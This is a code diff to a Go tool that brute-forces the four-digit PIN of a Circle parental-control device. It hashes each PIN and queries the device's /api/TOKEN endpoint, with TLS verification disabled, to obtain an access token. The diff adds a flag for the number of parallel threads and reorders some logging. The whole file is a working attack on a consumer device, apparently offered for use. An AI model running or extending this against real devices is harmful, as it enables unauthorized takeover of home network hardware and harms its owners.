@@ -4,6 +4,7 @@ import (
 	"crypto/sha1"
 	"crypto/tls"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -22,6 +23,7 @@ type CircleSession struct {
 const APPID = "HackMyCircleDevice99" // min length: 20
 
 func (session *CircleSession) findCircleToken(start int, stop int) {
+	fmt.Printf("Searching: start:%v, end:%v\n", start, stop)
 	defer session.Wg.Done()
 	for x := start; x <= stop; x++ {
 		pincode := fmt.Sprintf("%04d", x)
@@ -37,15 +39,13 @@ func (session *CircleSession) findCircleToken(start int, stop int) {
 		start := time.Now()
 
 		res, err := session.Client.Get("https://" + session.IpAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
-		if (x % 10) == 0 {
-			fmt.Printf("Get(): time elapsed: %v\n", time.Since(start))
-		}
 		if err != nil {
 			fmt.Println(err.Error())
 			os.Exit(1)
 		}
-		// test url
-		//res, err := http.Get("http://" + ipAddress + ":8000")
+		if (x % 10) == 0 {
+			fmt.Printf("Get(): time elapsed: %v\n", time.Since(start))
+		}
 		body, err := ioutil.ReadAll(res.Body)
 		if err != nil {
 			fmt.Println(err.Error())
@@ -69,12 +69,19 @@ func (session *CircleSession) findCircleToken(start int, stop int) {
 
 func main() {
 
-	if len(os.Args) < 2 {
-		fmt.Printf("usage: %v: <circle-ip-address>\n", os.Args[0])
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "usage: %v: [-t n] <circle-ip-address>\n", os.Args[0])
+		flag.PrintDefaults()
+	}
+	threadsPtr := flag.Int("t", 4, "Number Of threads to use")
+	flag.Parse()
+	//fmt.Printf("Args: %v (%v)\n", flag.Args(), flag.NArg())
+
+	if flag.NArg() != 1 {
+		flag.Usage()
 		os.Exit(1)
 	}
-
-	ipAddress := os.Args[1]
+	ipAddress := flag.Arg(0)
 	fmt.Printf("using ip address: %v\n", ipAddress)
 
 	// NOTE: the following line doesn't work because the Circle device
@@ -84,14 +91,15 @@ func main() {
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress, StartTime: time.Now()}
-	session.Wg.Add(1)
-	go session.findCircleToken(0, 2500)
-	session.Wg.Add(1)
-	go session.findCircleToken(2501, 5000)
-	session.Wg.Add(1)
-	go session.findCircleToken(5001, 7500)
-	session.Wg.Add(1)
-	go session.findCircleToken(7501, 9999)
+	threads := *threadsPtr
+	fmt.Printf("Using %v Threads\n", threads)
+	groupSize := int(10000 / threads)
+	for x := 0; x < threads; x++ {
+		session.Wg.Add(1)
+		start := groupSize * x
+		end := (groupSize * (x + 1)) - 1
+		go session.findCircleToken(start, end)
+	}
 	session.Wg.Wait()
 	os.Exit(0)
 }
